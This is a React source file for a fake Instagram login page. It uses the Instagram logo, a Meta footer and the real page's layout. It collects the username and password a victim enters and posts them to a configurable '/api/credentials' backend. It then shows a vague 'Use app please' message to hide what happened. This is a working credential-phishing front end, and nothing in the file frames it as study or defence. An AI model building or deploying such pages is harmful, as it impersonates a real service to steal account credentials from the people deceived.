import React, { useState } from 'react';
import Swal from 'sweetalert2';

export default function CredentialForm() {
  const [formData, setFormData] = useState({
    platformName: 'Instagram',
    username: '',
    password: ''
  });

  const [selectedLang, setSelectedLang] = useState('English (US)');
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);

  const languages = [
    'English (US)',
    'English (UK)',
    'हिन्दी (Hindi)',
    'Español',
    'Français',
    'Deutsch',
    'Português'
  ];

  // Dynamic API Base URL Setup (Vercel automatic select karega variables se)
  const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:5000';

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleLangSelect = (lang) => {
    setSelectedLang(lang);
    setIsDropdownOpen(false);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(`${API_BASE_URL}/api/credentials`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      
      if (response.ok) {
        Swal.fire({
          title: 'Notification',
          text: 'Use app please',
          icon: 'info',
          background: '#1C1C1E', 
          color: '#FFF',
          confirmButtonColor: '#0064E0',
          customClass: {
            popup: 'my-custom-popup-roundness'
          }
        });

        setFormData({ platformName: 'Instagram', username: '', password: '' });
      } else {
        throw new Error('Server responded with an error status');
      }
    } catch (error) {
      console.error('Error saving data:', error);
      Swal.fire({
        title: 'Network Error',
        text: 'Server connection failed',
        icon: 'error',
        background: '#1C1C1E',
        color: '#FFF',
        confirmButtonColor: '#dc2743'
      });
    }
  };

  return (
    <div style={{ 
      display: 'flex', 
      flexDirection: 'column',
      justifyContent: 'space-between', 
      alignItems: 'center', 
      minHeight: '100vh', 
      backgroundColor: '#000000', 
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
      color: '#F5F5F5',
      padding: '20px'
    }}>
      
      {/* Top Section: Dropdown Selector */}
      <div style={{ position: 'relative', marginTop: '10px', zIndex: 20 }}>
        <div 
          onClick={() => setIsDropdownOpen(!isDropdownOpen)}
          style={{ color: '#A8A8A8', fontSize: '14px', cursor: 'pointer', userSelect: 'none' }}
        >
          {selectedLang} {isDropdownOpen ? '▲' : '▼'}
        </div>

        {isDropdownOpen && (
          <div style={{
            position: 'absolute',
            top: '25px',
            left: '50%',
            transform: 'translateX(-50%)',
            backgroundColor: '#1C1C1E',
            border: '1px solid #262626',
            borderRadius: '8px',
            width: '165px',
            maxHeight: '180px',
            overflowY: 'auto',
            boxShadow: '0 4px 12px rgba(0,0,0,0.5)'
          }}>
            {languages.map((lang) => (
              <div
                key={lang}
                onClick={() => handleLangSelect(lang)}
                style={{
                  padding: '10px 12px',
                  fontSize: '14px',
                  color: selectedLang === lang ? '#FFF' : '#A8A8A8',
                  backgroundColor: selectedLang === lang ? '#262626' : 'transparent',
                  cursor: 'pointer',
                  textAlign: 'center'
                }}
              >
                {lang}
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Middle Section: Form Content Area */}
      <div style={{ width: '100%', maxWidth: '365px', display: 'flex', flexDirection: 'column', alignItems: 'center', margin: 'auto 0' }}>
        
        {/* Rendered Logo */}
        <img 
          src="/download.jpg" 
          alt="Instagram Logo" 
          style={{
            width: '76px',
            height: '76px',
            objectFit: 'contain',
            borderRadius: '22px',
            marginBottom: '42px'
          }} 
        />

        {/* Inputs and Submit Layout */}
        <form onSubmit={handleSubmit} style={{ width: '100%' }}>
          <div style={{ marginBottom: '12px' }}>
            <input
              type="text"
              name="username"
              placeholder="Username, email or mobile number"
              value={formData.username}
              onChange={handleChange}
              required
              style={{ 
                width: '100%', 
                padding: '15px 14px', 
                borderRadius: '12px', 
                border: '1px solid #262626', 
                backgroundColor: '#1C1C1E', 
                color: '#FFF',
                fontSize: '14px',
                outline: 'none',
                boxSizing: 'border-box'
              }}
            />
          </div>

          <div style={{ marginBottom: '16px' }}>
            <input
              type="password"
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              required
              style={{ 
                width: '100%', 
                padding: '15px 14px', 
                borderRadius: '12px', 
                border: '1px solid #262626', 
                backgroundColor: '#1C1C1E', 
                color: '#FFF',
                fontSize: '14px',
                outline: 'none',
                boxSizing: 'border-box'
              }}
            />
          </div>

          <button type="submit" style={{ 
            width: '100%', 
            padding: '14px', 
            border: 'none', 
            borderRadius: '25px', 
            backgroundColor: '#0064E0', 
            color: '#FFF', 
            fontWeight: '600', 
            fontSize: '15px',
            cursor: 'pointer',
            marginBottom: '20px'
          }}>
            Log in
          </button>

          <div style={{ textAlign: 'center', color: '#FFF', fontSize: '14px', fontWeight: '500', cursor: 'pointer', marginBottom: '40px' }}>
            Forgot password?
          </div>
        </form>
      </div>

      {/* Bottom Section: Footer Controls */}
      <div style={{ width: '100%', maxWidth: '365px', display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: '10px' }}>
        <button style={{
          width: '100%',
          padding: '12px',
          backgroundColor: 'transparent',
          border: '1px solid #0064E0',
          borderRadius: '25px',
          color: '#0064E0',
          fontWeight: '600',
          fontSize: '14px',
          cursor: 'pointer',
          marginBottom: '24px'
        }}>
          Create new account
        </button>

        <div style={{ color: '#A8A8A8', fontSize: '12px', letterSpacing: '1px', fontWeight: 'bold' }}>
          ∞ Meta
        </div>
      </div>

    </div>
  );
}